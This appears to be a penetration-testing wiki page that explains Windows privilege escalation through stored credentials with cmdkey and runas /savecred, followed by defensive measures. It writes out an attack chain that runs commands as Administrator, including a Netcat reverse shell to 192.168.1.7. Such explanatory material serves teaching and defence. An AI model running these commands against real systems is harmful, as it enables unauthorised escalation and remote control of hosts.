# Escalation via RunAs

## cmdkey and runas Command

In Windows, **cmdkey** and **runas** are powerful commands used for managing credentials and executing programs under different user accounts. While they can be useful for legitimate administrative tasks, they can also be exploited for **privilege escalation** and **persistence** in an attack scenario.

## cmdkey

The **`cmdkey`** command is used to create, list, or delete stored usernames and passwords. This can be useful for automating authentication to networked resources or systems.

- Adding Credentials

```cmd
cmdkey /add:win11-admin /user:administrator /pass:123
```

> Adds credentials for a remote system (`win11-admin`) with the username `administrator` and password `123`.

```cmd
cmdkey /add:test1 /user:rahul /pass:@rmour123
```

> Adds credentials for a user (`rahul`) on a system (`test1`).

```cmd
cmdkey /add:admin1 /user:Administrator /pass:@rmour123
```

> Adds credentials for the `Administrator` user on the system `admin1`.

- Listing Stored Credentials

```cmd
cmdkey /list
```
> Lists all stored credentials on the system.

- Deleting Credentials

```cmd
cmdkey /delete:<target>
```

 > Deletes the stored credentials for the specified target.

### Security Considerations

- **Credential Leakage**: Stored credentials may be misused if an attacker gains access to the system.

- **Network Persistence**: Attackers can store credentials for network resources, enabling access without re-entering passwords.


## runas

The **`runas`** command allows a user to execute a program under a different user account. It is commonly used to run applications with alternate credentials.

- Running a Command with Another User’s Credentials

```cmd
runas /user:win11-admin\administrator /savecred "C:\Windows\System32\cmd.exe /c mkdir C:\users\armour\demo"
```

> Creates a directory using the credentials of `armour`.

- Executing Commands via runas (Ping)


```cmd
runas /user:win11-admin\administrator /savecred "C:\Windows\System32\cmd.exe /c ping 192.168.1.7"
```

> Executes a network connectivity test using the credentials of `armour`.

- Running whoami

```cmd
runas /user:win11-admin\administrator /savecred "C:\Windows\System32\cmd.exe /c whoami /all && pause"
```
> Displays the current user context.

- Executing a Reverse Shell via runas

```cmd
runas /user:win11-admin\administrator /savecred "C:\Windows\System32\cmd.exe /c nc64.exe -e cmd.exe 192.168.1.7 443"
```
> Executes Netcat as `Administrator`, opening a reverse shell.

### Security Considerations

- **Privilege Escalation**: If saved credentials exist, a low-privileged user may execute commands as a higher-privileged account.

- **Stored Credentials Risk**: The `/savecred` option can expose credentials to abuse.

- **Lateral Movement**: Stored credentials may be reused to access other systems.


## Defensive Measures

### 1. Restrict cmdkey and runas Usage

- Use **AppLocker** or **Windows Defender Application Control (WDAC)** to restrict `cmdkey.exe` and `runas.exe`.

- Apply **Group Policy** to limit who can use `runas`.

### 2. Monitor Saved Credentials

- Regularly audit stored credentials using:

```cmd
cmdkey /list
```

- Remove unnecessary or suspicious entries.

- Enable **Windows Credential Guard** where possible.

### 3. User Awareness

- Educate users about the risks of using `/savecred`.

- Enforce least-privilege principles for administrative accounts.


## Conclusion

**cmdkey** and **runas** are legitimate administrative tools that can become dangerous when misused. Improper handling of saved credentials can lead to **privilege escalation**, **persistence**, and **lateral movement**. Strong access controls, monitoring, and user education are critical to reducing risk in Windows environments.

## Related
- [Escalate My Privilege Windows](Escalate-My-Privilege-Windows.md) — the escalation methodology this fits into
- Pass The Hash Attack — alternative credential reuse
- Mimikatz Usage and Execution — harvest creds for runas
- [Privilege Escalation via Startup Applications](Privilege-Escalation-via-Startup-Applications.md) — alternative payload execution route
